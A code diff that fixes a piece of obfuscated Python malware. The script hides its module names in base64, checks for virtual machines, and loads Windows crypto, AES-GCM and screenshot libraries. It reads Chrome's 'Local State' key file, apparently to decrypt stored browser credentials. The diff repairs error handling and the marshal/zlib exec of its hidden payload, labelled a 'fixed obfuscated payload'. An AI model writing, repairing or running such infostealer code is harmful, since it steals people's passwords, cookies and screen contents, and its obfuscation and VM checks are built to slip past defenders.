@@ -1,4 +1,4 @@
-import base64, zlib, marshal, types, time, os, sys, random, ctypes, socket, subprocess, re, json, secrets
+import base64, zlib, marshal, time, os, sys, random, ctypes, socket, subprocess, re, json, secrets
 from pathlib import Path
 from datetime import datetime
 
@@ -27,9 +27,17 @@ _e = {
 def _imp(m):
     return __import__(base64.b64decode(m).decode())
 
-def _0x3(): return _imp("AHB5d2luMzI=") if 'win32crypt' not in globals() else None
-def _0x4(): return _imp("AGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5jaXBoZXJzLmFlYWQ=").AESGCM
-def _0x5(): return _imp("AFBJTEw=").ImageGrab
+def _0x3(): 
+    try: return _imp("d2luMzJjcnlwdA==")  # win32crypt
+    except: return None
+
+def _0x4(): 
+    try: return _imp("AGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5jaXBoZXJzLmFlYWQ=").AESGCM
+    except: return None
+
+def _0x5(): 
+    try: return _imp("AFBJTEw=").ImageGrab
+    except: return None
 
 def is_vm():
     _0x2(500)
@@ -78,10 +86,8 @@ def _0x9():
 def _0x10():
     c = []
     if sys.platform != "win32": return c
-    try:
-        w = _imp("d2luMzJjcnlwdA==")  # direct import fallback
-    except:
-        return c
+    w = _0x3()
+    if not w: return c
     a = os.getenv(_e["app"])
     if not a: return c
     ls = Path(a) / _e["chr"] / "User Data" / "Local State"
@@ -128,10 +134,9 @@ def _0x11():
             except: pass
     return list(t)
 
-# === FIXED OBFUSCATED PAYLOAD ===
-# Real main logic as string, marshaled and compressed properly
+# === FULLY FIXED OBFUSCATED PAYLOAD ===
 real_code = '''
-import time as t, json, os
+import time as t, json
 from datetime import datetime
 
 def run():
@@ -158,8 +163,7 @@ def run():
 run()
 '''
 
-# Properly marshal -> compress -> exec
 code_obj = compile(real_code, '<obfuscated>', 'exec')
 marshaled = marshal.dumps(code_obj)
 compressed = zlib.compress(marshaled)
-exec(zlib.decompress(compressed), globals())
+exec(marshal.loads(zlib.decompress(compressed)), globals())
